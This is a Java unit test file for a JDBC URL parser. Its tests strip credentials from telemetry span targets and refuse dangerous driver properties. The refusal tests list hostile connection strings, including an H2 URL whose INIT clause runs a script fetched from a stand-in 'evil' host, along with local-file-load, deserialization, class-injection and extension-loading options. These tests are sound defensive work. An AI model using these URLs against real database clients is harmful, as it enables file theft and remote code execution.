/**
 * Copyright 2025-2026 Naftiko
 *
 * Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except
 * in compliance with the License. You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software distributed under the License
 * is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express
 * or implied. See the License for the specific language governing permissions and limitations under
 * the License.
 */
package io.ikanos.engine.consumes.sql;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.util.Map;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

class JdbcUrlTest {

    @Test
    void spanTargetShouldNameSystemHostAndDatabaseOfAPostgresUrl() {
        JdbcUrl url = JdbcUrl.parse("jdbc:postgresql://db.internal:5432/erp?ssl=true");

        assertEquals("postgresql://db.internal/erp", url.spanTarget());
    }

    @Test
    void spanTargetShouldReadTheDatabaseNamePropertyOfASqlServerUrl() {
        JdbcUrl url = JdbcUrl.parse("jdbc:sqlserver://wh:1433;databaseName=billing;encrypt=true");

        assertEquals("sqlserver://wh/billing", url.spanTarget());
    }

    @Test
    void spanTargetShouldNotReadADatabaseNameFromABracedSqlServerPassword() {
        JdbcUrl url = JdbcUrl.parse("jdbc:sqlserver://db:1433;"
                + "password={prefix;databaseName=su}}ffix};databaseName=billing");

        assertEquals("sqlserver://db/billing", url.spanTarget());
    }

    @Test
    void spanTargetShouldLeaveOutABracedSqlServerDatabaseName() {
        JdbcUrl url = JdbcUrl.parse("jdbc:sqlserver://db:1433;databaseName={bil;ling}");

        assertEquals("sqlserver://db", url.spanTarget());
    }

    @Test
    void spanTargetShouldReadAnOracleThinUrl() {
        JdbcUrl url = JdbcUrl.parse("jdbc:oracle:thin:@//ora.internal:1521/FINANCE");

        assertEquals("oracle://ora.internal/FINANCE", url.spanTarget());
    }

    @Test
    void spanTargetShouldNameAFileDatabaseWithoutItsDirectory() {
        JdbcUrl url = JdbcUrl.parse("jdbc:sqlite:/var/data/catalog.db");

        assertEquals("sqlite://local/catalog.db", url.spanTarget());
    }

    @Test
    void spanTargetShouldDropTheCredentialsOfAnOracleThinSidUrl() {
        JdbcUrl url = JdbcUrl.parse("jdbc:oracle:thin:scott/s3cret@ora.internal:1521:FIN");

        assertEquals("oracle://ora.internal/FIN", url.spanTarget());
        assertEquals("FIN", url.database());
    }

    @Test
    void spanTargetShouldDropThePropertiesOfAnOracleThinServiceUrl() {
        JdbcUrl url = JdbcUrl.parse("jdbc:oracle:thin:@ora:1521/FIN?password=s3cret");

        assertEquals("oracle://ora/FIN", url.spanTarget());
        assertEquals("FIN", url.database());
    }

    @Test
    void spanTargetShouldNotReadAnUnknownShapeThatCarriesAnAt() {
        JdbcUrl url = JdbcUrl.parse("jdbc:acme:admin/s3cret@db:9999:main");

        assertFalse(url.spanTarget().contains("s3cret"), url.spanTarget());
        assertEquals(null, url.database());
    }

    @Test
    void dialectShouldFollowTheSubprotocol() {
        assertEquals(SqlStatement.Dialect.SQLSERVER,
                JdbcUrl.parse("jdbc:sqlserver://wh:1433").dialect());
        assertEquals(SqlStatement.Dialect.POSTGRESQL,
                JdbcUrl.parse("jdbc:postgresql://db/erp").dialect());
        assertEquals(SqlStatement.Dialect.SQLITE, JdbcUrl.parse("jdbc:sqlite:x.db").dialect());
        assertEquals(SqlStatement.Dialect.ORACLE,
                JdbcUrl.parse("jdbc:oracle:thin:@//ora:1521/FIN").dialect());
        assertEquals(SqlStatement.Dialect.STANDARD, JdbcUrl.parse("jdbc:h2:mem:x").dialect());
    }

    @Test
    void spanTargetShouldNeverCarryCredentials() {
        JdbcUrl url = JdbcUrl.parse("jdbc:postgresql://admin:s3cret@db:5432/erp?password=x");

        assertFalse(url.spanTarget().contains("s3cret"), url.spanTarget());
        assertFalse(url.spanTarget().contains("password"), url.spanTarget());
    }

    @Test
    void checkShouldRefuseAUrlThatIsNotJdbc() {
        IllegalArgumentException e = assertThrows(IllegalArgumentException.class,
                () -> JdbcUrl.check("erp", "https://db.internal/erp", Map.of()));

        assertFalse(e.getMessage().contains("db.internal"), e.getMessage());
    }

    @ParameterizedTest
    @ValueSource(strings = {
        "jdbc:mysql://db/erp?allowLoadLocalInfile=true",
        "jdbc:mariadb://db/erp?user=a&autoDeserialize=true",
        "jdbc:mariadb://db/erp?allowLocalInfile=true",
        "jdbc:postgresql://db/erp?socketFactory=x.Y",
        "jdbc:postgresql://db/erp?sslfactory=x.Y",
        "jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://evil/x.sql'",
        "jdbc:sqlite:/var/data/x.db?enable_load_extension=true"
    })
    void checkShouldRefuseDangerousDriverPropertiesInTheUrl(String url) {
        IllegalArgumentException e = assertThrows(IllegalArgumentException.class,
                () -> JdbcUrl.check("erp", url, Map.of()));

        assertTrue(e.getMessage().contains("refused"), e.getMessage());
    }

    @Test
    void checkShouldRefuseDangerousDriverPropertiesInConnectionProperties() {
        assertThrows(IllegalArgumentException.class, () -> JdbcUrl.check("erp",
                "jdbc:mysql://db/erp", Map.of("AllowLoadLocalInfile", "true")));
    }

    @Test
    void checkShouldRefuseSqliteExtensionLoadingInConnectionProperties() {
        assertThrows(IllegalArgumentException.class, () -> JdbcUrl.check("erp",
                "jdbc:sqlite:/var/data/x.db", Map.of("enable_load_extension", "true")));
    }

    @Test
    void checkShouldAcceptOrdinaryDriverProperties() {
        JdbcUrl url = JdbcUrl.check("erp", "jdbc:postgresql://db/erp?ssl=true&sslmode=verify-full",
                Map.of("ApplicationName", "ikanos"));

        assertEquals("postgresql", url.system());
    }

    @ParameterizedTest
    @ValueSource(strings = {
        "jdbc:mysql://(host=db,port=3306,allowLoadLocalInfile=true)/erp",
        "jdbc:mysql://address=(host=db)(queryInterceptors=x.Y)/erp",
        "jdbc:mysql://db/erp?allowLoad%4CocalInfile=true",
        "jdbc:sqlserver://db:1433;trustManagerClass=x.Y"
    })
    void checkShouldRefuseDangerousPropertiesInEveryUrlForm(String url) {
        assertThrows(IllegalArgumentException.class, () -> JdbcUrl.check("erp", url, Map.of()));
    }

    @Test
    void mysqlDialectShouldHoldForMysqlAndMariadbOnly() {
        assertTrue(JdbcUrl.parse("jdbc:mysql://db/erp").mysqlDialect());
        assertTrue(JdbcUrl.parse("jdbc:mariadb://db/erp").mysqlDialect());
        assertFalse(JdbcUrl.parse("jdbc:postgresql://db/erp").mysqlDialect());
    }

    @Test
    void spanTargetShouldReadOnlyTheHostOfAMysqlKeyValueAuthority() {
        JdbcUrl url = JdbcUrl.parse(
                "jdbc:mysql://(host=db,port=3306,user=reader,password=s3cret)/erp");

        assertEquals("mysql://db/erp", url.spanTarget());
    }

    @Test
    void spanTargetShouldNotReadAPasswordWithAnAtSignAsTheHost() {
        JdbcUrl url = JdbcUrl.parse("jdbc:mysql://reader:p@ss@db:3306/erp");

        assertEquals("mysql://db/erp", url.spanTarget());
    }

    @Test
    void spanTargetShouldReadOnlyTheHostOfAKeyValueAuthorityWithAnAtSignInItsPassword() {
        JdbcUrl url = JdbcUrl.parse("jdbc:mysql://(host=db,user=reader,password=s3cr@t)/erp");

        assertEquals("mysql://db/erp", url.spanTarget());
    }

    @Test
    void spanTargetShouldReadOnlyTheHostOfAMysqlAddressAuthority() {
        JdbcUrl url = JdbcUrl.parse("jdbc:mysql://address=(host=db)(password=s3cret)/erp");

        assertEquals("mysql://db/erp", url.spanTarget());
    }

    @Test
    void withoutUserInfoShouldMoveTheCredentialsOfAMysqlAuthority() {
        JdbcUrl.WithoutUserInfo split =
                JdbcUrl.withoutUserInfo("jdbc:mysql://reader:p%40ss@word@db:3306/erp?ssl=true");

        assertEquals("jdbc:mysql://db:3306/erp?ssl=true", split.url());
        assertEquals("reader", split.user());
        assertEquals("p@ss@word", split.password());
    }

    @ParameterizedTest
    @ValueSource(strings = {"jdbc:postgresql://reader:s3cret@db:5432/erp",
        "jdbc:mariadb://reader:s3cret@db:3306/erp",
        "jdbc:mysql:replication://reader:s3cret@db:3306/erp"})
    void withoutUserInfoShouldMoveTheCredentialsOfEveryAuthorityForm(String url) {
        JdbcUrl.WithoutUserInfo split = JdbcUrl.withoutUserInfo(url);

        assertFalse(split.url().contains("s3cret"), split.url());
        assertFalse(split.url().contains("reader"), split.url());
        assertTrue(split.url().endsWith("//db:" + (url.contains("postgresql") ? "5432" : "3306")
                + "/erp"), split.url());
        assertEquals("reader", split.user());
        assertEquals("s3cret", split.password());
    }

    @Test
    void withoutUserInfoShouldMoveAUserWithoutAPassword() {
        JdbcUrl.WithoutUserInfo split = JdbcUrl.withoutUserInfo("jdbc:mysql://reader@db/erp");

        assertEquals("jdbc:mysql://db/erp", split.url());
        assertEquals("reader", split.user());
        assertEquals(null, split.password());
    }

    @Test
    void withoutUserInfoShouldMoveTheCredentialsOfAnOracleThinUrl() {
        JdbcUrl.WithoutUserInfo split =
                JdbcUrl.withoutUserInfo("jdbc:oracle:thin:scott/s3cret@//ora:1521/FINANCE");

        assertEquals("jdbc:oracle:thin:@//ora:1521/FINANCE", split.url());
        assertEquals("scott", split.user());
        assertEquals("s3cret", split.password());
    }

    @Test
    void withoutUserInfoShouldMoveTheCredentialsOfAnOracleThinSidUrl() {
        JdbcUrl.WithoutUserInfo split =
                JdbcUrl.withoutUserInfo("jdbc:oracle:thin:scott/s3/cret@ora:1521:FIN");

        assertEquals("jdbc:oracle:thin:@ora:1521:FIN", split.url());
        assertEquals("scott", split.user());
        assertEquals("s3/cret", split.password());
    }

    @ParameterizedTest
    @ValueSource(strings = {"jdbc:postgresql://db:5432/erp",
        "jdbc:sqlserver://db:1433;databaseName=erp;user=reader;password=s3cret",
        "jdbc:oracle:thin:@//ora:1521/FINANCE",
        "jdbc:oracle:thin:/@finance_alias",
        "jdbc:oracle:thin:@//ora:1521/FIN@ANCE",
        "jdbc:oracle:thin:scott/\"p@ss\"@ora:1521:FIN",
        "jdbc:mysql://reader:s3cret@db1,db2/erp",
        "jdbc:mysql://u1:p1@db1,u2:p2@db2/erp",
        "jdbc:mysql://(host=db,user=reader,password=s3cr@t)/erp",
        "jdbc:h2:mem:erp",
        "jdbc:sqlite:/var/data/catalog.db"})
    void withoutUserInfoShouldLeaveAUrlWithoutMovableUserInfo(String url) {
        JdbcUrl.WithoutUserInfo split = JdbcUrl.withoutUserInfo(url);

        assertEquals(url, split.url());
        assertEquals(null, split.user());
        assertEquals(null, split.password());
    }
}
